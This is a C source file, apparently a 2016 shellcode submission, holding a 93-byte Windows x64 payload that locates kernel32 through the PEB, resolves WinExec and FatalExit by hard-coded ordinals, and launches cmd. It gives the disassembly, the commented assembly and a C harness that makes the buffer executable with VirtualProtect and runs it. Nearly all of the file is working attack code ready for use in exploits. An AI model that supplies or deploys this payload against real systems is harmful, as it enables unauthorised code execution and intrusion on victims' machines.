/*
	# Title : Windows x64 WinExec() shellcode
	# Date : 15-10-2016
	# Author : Roziul Hasan Khan Shifat
	# size : 93 bytes
	# Tested on : Windows 7 Ultimate x64
*/


/*
Disassembly of section .text:

0000000000000000 <_start>:
   0:	99                   	cltd
   1:	65 48 8b 42 60       	mov    %gs:0x60(%rdx),%rax
   6:	48 8b 40 18          	mov    0x18(%rax),%rax
   a:	48 8b 70 10          	mov    0x10(%rax),%rsi
   e:	48 ad                	lods   %ds:(%rsi),%rax
  10:	48 8b 30             	mov    (%rax),%rsi
  13:	48 8b 7e 30          	mov    0x30(%rsi),%rdi
  17:	48 31 db             	xor    %rbx,%rbx
  1a:	48 31 f6             	xor    %rsi,%rsi
  1d:	8b 5f 3c             	mov    0x3c(%rdi),%ebx
  20:	48 01 fb             	add    %rdi,%rbx
  23:	b2 88                	mov    $0x88,%dl
  25:	8b 1c 13             	mov    (%rbx,%rdx,1),%ebx
  28:	48 01 fb             	add    %rdi,%rbx
  2b:	8b 73 1c             	mov    0x1c(%rbx),%esi
  2e:	48 01 fe             	add    %rdi,%rsi
  31:	99                   	cltd
  32:	66 ba 27 05          	mov    $0x527,%dx
  36:	8b 04 96             	mov    (%rsi,%rdx,4),%eax
  39:	48 01 f8             	add    %rdi,%rax
  3c:	eb 17                	jmp    55 <c>

000000000000003e <exec>:
  3e:	59                   	pop    %rcx
  3f:	99                   	cltd
  40:	48 ff c2             	inc    %rdx
  43:	ff d0                	callq  *%rax
  45:	99                   	cltd
  46:	66 ba 29 01          	mov    $0x129,%dx
  4a:	8b 04 96             	mov    (%rsi,%rdx,4),%eax
  4d:	48 01 f8             	add    %rdi,%rax
  50:	48 31 c9             	xor    %rcx,%rcx
  53:	ff d0                	callq  *%rax

0000000000000055 <c>:
  55:	e8 e4 ff ff ff       	callq  3e <exec>
  5a:	63 6d 64             	movslq 0x64(%rbp),%ebp
	...
*/


/*
bits 64
section .text
	global  _start
_start:


cdq
mov rax,[gs:rdx+0x60] ;PEB
mov rax,[rax+0x18] ;PEB.Ldr
mov rsi,[rax+0x10] ;PEB.Ldr->InMemOrderModuleList
lodsq
mov rsi,[rax]
mov rdi,[rsi+0x30] ;kernel32.dll base address


xor rbx,rbx
xor rsi,rsi


mov ebx,[rdi+0x3c] ;elf_anew
add rbx,rdi ;PE HEADER
mov dl,0x88
mov ebx,[rbx+rdx] ;DataDirectory->VirtualAddress
add rbx,rdi ;IMAGE_EXPORT_DIRECTORY

mov esi,[rbx+0x1c] ;AddressOfFunctions
add rsi,rdi


cdq

mov dx,1319 ;Ordinal of WinExec()





mov eax,[rsi+rdx*4]
add rax,rdi ;rax=WinExec()


;WinExec("cmd",1)


jmp c

exec:
pop rcx
cdq
inc rdx
call rax


cdq
mov dx,297

mov eax,[rsi+rdx*4]
add rax,rdi ;rax=FatalExit()

;FatalExit(0)

xor rcx,rcx
call rax



c:

call exec
db 'cmd',0,0
*/


#include<stdio.h>
#include<string.h>
#include<windows.h>


char shellcode[]="\x99\x65\x48\x8b\x42\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x48\x31\xdb\x48\x31\xf6\x8b\x5f\x3c\x48\x01\xfb\xb2\x88\x8b\x1c\x13\x48\x01\xfb\x8b\x73\x1c\x48\x01\xfe\x99\x66\xba\x27\x05\x8b\x04\x96\x48\x01\xf8\xeb\x17\x59\x99\x48\xff\xc2\xff\xd0\x99\x66\xba\x29\x01\x8b\x04\x96\x48\x01\xf8\x48\x31\xc9\xff\xd0\xe8\xe4\xff\xff\xff\x63\x6d\x64";


main()
{
	int len=strlen(shellcode);
	DWORD l=0;
	printf("shellcode length %d bytes\n",len );
	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
	(*  (int(*)()) shellcode    ) ();
}